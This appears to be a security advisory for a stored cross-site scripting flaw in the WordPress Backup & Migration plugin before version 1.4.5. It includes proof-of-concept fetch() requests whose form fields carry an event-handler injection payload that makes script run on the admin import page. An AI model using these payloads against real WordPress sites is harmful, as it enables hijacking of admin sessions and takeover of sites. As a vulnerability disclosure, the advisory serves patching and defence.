## WordPress Plugin Vulnerabilities

# WordPress Backup & Migration < 1.4.5 - Subscriber+ Stored XSS

### Description

The plugin does not sanitise and escape some parameters, which could allow users with a role as low as Subscriber to perform Cross-Site Scripting attacks.

This was partially fixed in version 1.4.4 but it still allowed XSS attacks from Admin users.

### Proof of Concept

fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
},
"body": "settings\_data%5Bim\_data\_size\_per\_req%5D=1&settings\_data%5Bim\_db\_file\_per\_req%5D=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert(%2FXSS%2F)+x&action=mgdp\_plugin\_save\_import\_settings",
"method": "POST",
"mode": "cors",
"credentials": "include"
});
Then the admin needs to click http://127.0.0.1:8001/wp-admin/admin.php?page=wp-migration-duplicator#wt-mgdp-import -> advanced options
---
On version 1.4.4, a site admin must run the following command on the Backup & Migration page:
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
},
"body": "settings\_data%5Bim\_data\_size\_per\_req%5D=1&settings\_data%5Bim\_db\_file\_per\_req%5D=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert(%2FXSS%2F)+x&action=mgdp\_plugin\_save\_import\_settings&\_wpnonce=" + wp\_migration\_duplicator\_import.nonces.main,
"method": "POST",
"mode": "cors",
"credentials": "include"
})
